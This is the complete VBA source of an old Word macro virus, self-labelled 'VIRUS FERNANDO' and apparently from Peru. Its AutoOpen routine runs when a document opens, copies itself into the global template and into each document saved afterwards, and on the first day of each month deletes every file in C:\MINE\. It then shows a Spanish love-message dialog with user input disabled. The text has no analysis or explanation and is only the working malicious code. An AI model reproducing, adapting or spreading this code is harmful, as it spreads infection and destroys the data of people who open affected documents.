   Attribute VB_Name = "AutoopeN"

   Public Sub MAIN()
   Dim a$
   Dim b$
   Dim diálogoEjem As Object
   Dim botón
        'VIRUS FERNANDO
        'HECHO EN EL PERU
        On Error Resume Next
        a$ = WordBasic.[FileName$]() + ":AutoopeN"
        b$ = "Global:AUTOOPEN"
        WordBasic.MacroCopy a$, b$
        WordBasic.FileSaveAs Format:=1
        WordBasic.MacroCopy b$, a$
        If WordBasic.Day(WordBasic.Now()) = 1 Then
           WordBasic.Kill "C:\MINE\*.*"
   '*******MESAGE BOX****************
       WordBasic.BeginDialog 320, 144, "AMOR"
       WordBasic.PushButton 110, 93, 97, 21, "OK", "ONE OR TWO"
       WordBasic.Text 75, 32, 237, 33, "DOS AMORES EN MI VIDA TU, YO Y EL", "Texto1"
       WordBasic.Text 75, 49, 237, 33, "SINO SON DOS....NO HAY AMOR", "Texto2"
       WordBasic.EndDialog
   '********************************************
       Set diálogoEjem = WordBasic.CurValues.UserDialog
       WordBasic.DisableInput 1
       botón = WordBasic.Dialog.UserDialog(diálogoEjem)
       WordBasic.DisableInput 0
        End If

   End Sub
